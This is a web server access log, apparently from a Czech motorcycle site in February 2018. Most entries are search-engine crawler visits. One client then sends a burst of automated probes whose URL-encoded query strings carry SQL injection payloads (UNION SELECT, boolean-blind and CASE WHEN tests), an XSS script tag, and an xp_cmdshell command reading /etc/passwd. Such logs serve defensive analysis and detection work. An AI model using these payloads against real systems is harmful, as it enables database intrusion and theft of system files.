77.75.79.72 - - [09/Feb/2018:08:04:17 +0100] "GET /robots.txt HTTP/1.1" 200 55 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
82.145.46.102 - - [09/Feb/2018:08:25:44 +0100] "GET /bikes/eska-mofa/cs HTTP/1.1" 200 11823 "-" "Mozilla/5.0 (compatible; aiHitBot/2.9; +https://www.aihitdata.com/about)"
82.145.46.102 - - [09/Feb/2018:08:25:45 +0100] "GET /bikes/jawa-cz-125/cs HTTP/1.1" 200 11825 "-" "Mozilla/5.0 (compatible; aiHitBot/2.9; +https://www.aihitdata.com/about)"
82.145.46.102 - - [09/Feb/2018:08:25:46 +0100] "GET /bikes/kawa-zr7s/cs HTTP/1.1" 200 11823 "-" "Mozilla/5.0 (compatible; aiHitBot/2.9; +https://www.aihitdata.com/about)"
82.145.46.102 - - [09/Feb/2018:08:25:47 +0100] "GET /bikes/phanomen-bob/cs HTTP/1.1" 200 11824 "-" "Mozilla/5.0 (compatible; aiHitBot/2.9; +https://www.aihitdata.com/about)"
82.145.46.102 - - [09/Feb/2018:08:25:48 +0100] "GET /bikes/stadion-s22/cs HTTP/1.1" 200 11823 "-" "Mozilla/5.0 (compatible; aiHitBot/2.9; +https://www.aihitdata.com/about)"
82.145.46.102 - - [09/Feb/2018:08:25:49 +0100] "GET /blog-entry/female-orgasm-day/cs HTTP/1.1" 200 11833 "-" "Mozilla/5.0 (compatible; aiHitBot/2.9; +https://www.aihitdata.com/about)"
216.244.66.230 - - [09/Feb/2018:08:26:19 +0100] "GET /robots.txt HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.230 - - [09/Feb/2018:08:26:20 +0100] "GET /robots.txt HTTP/1.1" 200 24 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.230 - - [09/Feb/2018:08:32:15 +0100] "GET /html/jcz150_06.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
42.236.46.85 - - [09/Feb/2018:08:33:10 +0100] "GET / HTTP/1.1" 301 185 "http://pehu.info/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
42.236.46.85 - - [09/Feb/2018:08:33:12 +0100] "GET / HTTP/1.1" 200 11810 "https://pehu.info/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
42.236.99.218 - - [09/Feb/2018:08:33:17 +0100] "GET / HTTP/1.1" 200 11810 "https://www.pehu.info/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
42.236.99.23 - - [09/Feb/2018:08:33:46 +0100] "GET / HTTP/1.1" 200 11810 "https://pehu.info/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
42.236.99.166 - - [09/Feb/2018:08:33:46 +0100] "GET / HTTP/1.1" 301 185 "http://www.pehu.info/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
42.236.99.166 - - [09/Feb/2018:08:33:48 +0100] "GET / HTTP/1.1" 200 11810 "https://pehu.info/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
192.241.212.225 - - [09/Feb/2018:08:37:43 +0100] "GET / HTTP/1.1" 301 185 "-" "Mozilla/5.0 zgrab/0.x"
216.244.66.230 - - [09/Feb/2018:08:52:09 +0100] "GET /robots.txt HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.230 - - [09/Feb/2018:08:52:10 +0100] "GET /robots.txt HTTP/1.1" 200 24 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.230 - - [09/Feb/2018:08:57:02 +0100] "GET /images/zete/zete.aspx HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
185.92.73.107 - - [09/Feb/2018:09:04:21 +0100] "HEAD /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2393.94"
185.92.73.107 - - [09/Feb/2018:09:04:22 +0100] "HEAD /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2393.94"
185.92.73.107 - - [09/Feb/2018:09:04:24 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:04:25 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:04:25 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI&hboM%3D5187%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:04:25 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI&hboM%3D5187%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:04:25 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:04:25 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:04:26 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%29%2C%22%2C%28%27%27.%22%27 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:04:26 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%29%2C%22%2C%28%27%27.%22%27 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:04:26 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27sDZoZm%3C%27%22%3EnaOOnT HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:04:26 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27sDZoZm%3C%27%22%3EnaOOnT HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:24 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%29%20AND%209398%3D1086%20AND%20%285513%3D5513 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:24 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%29%20AND%209398%3D1086%20AND%20%285513%3D5513 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:24 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%29%20AND%202743%3D2743%20AND%20%288910%3D8910 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:24 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%29%20AND%202743%3D2743%20AND%20%288910%3D8910 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:25 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%20AND%203682%3D3500 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:25 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%20AND%203682%3D3500 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:25 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%20AND%202743%3D2743 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:25 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%20AND%202743%3D2743 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:25 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%29%20AND%205133%3D7539%20AND%20%28%27QMdI%27%3D%27QMdI HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:25 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%29%20AND%205133%3D7539%20AND%20%28%27QMdI%27%3D%27QMdI HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:25 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%29%20AND%202743%3D2743%20AND%20%28%27OVII%27%3D%27OVII HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:25 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%29%20AND%202743%3D2743%20AND%20%28%27OVII%27%3D%27OVII HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:25 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%20AND%201379%3D7532%20AND%20%27cjHq%27%3D%27cjHq HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:25 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%20AND%201379%3D7532%20AND%20%27cjHq%27%3D%27cjHq HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:25 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%20AND%202743%3D2743%20AND%20%27VWgj%27%3D%27VWgj HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:25 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%20AND%202743%3D2743%20AND%20%27VWgj%27%3D%27VWgj HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:25 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%25%27%20AND%208068%3D2757%20AND%20%27%25%27%3D%27 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:26 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%25%27%20AND%208068%3D2757%20AND%20%27%25%27%3D%27 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:26 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%25%27%20AND%202743%3D2743%20AND%20%27%25%27%3D%27 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:26 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%25%27%20AND%202743%3D2743%20AND%20%27%25%27%3D%27 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:26 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%20AND%204381%3D8093--%20nvKD HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:26 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%20AND%204381%3D8093--%20nvKD HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:26 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%20AND%202743%3D2743--%20fkyR HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:26 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%20AND%202743%3D2743--%20fkyR HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:26 +0100] "GET /script/web-animations.min.js?v=%28SELECT%20%28CASE%20WHEN%20%286502%3D7869%29%20THEN%206502%20ELSE%206502%2A%28SELECT%206502%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%29%20END%29%29 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:26 +0100] "GET /script/web-animations.min.js?v=%28SELECT%20%28CASE%20WHEN%20%286502%3D7869%29%20THEN%206502%20ELSE%206502%2A%28SELECT%206502%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%29%20END%29%29 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:26 +0100] "GET /script/web-animations.min.js?v=%28SELECT%20%28CASE%20WHEN%20%289141%3D9141%29%20THEN%209141%20ELSE%209141%2A%28SELECT%209141%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%29%20END%29%29 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:26 +0100] "GET /script/web-animations.min.js?v=%28SELECT%20%28CASE%20WHEN%20%289141%3D9141%29%20THEN%209141%20ELSE%209141%2A%28SELECT%209141%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%29%20END%29%29 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
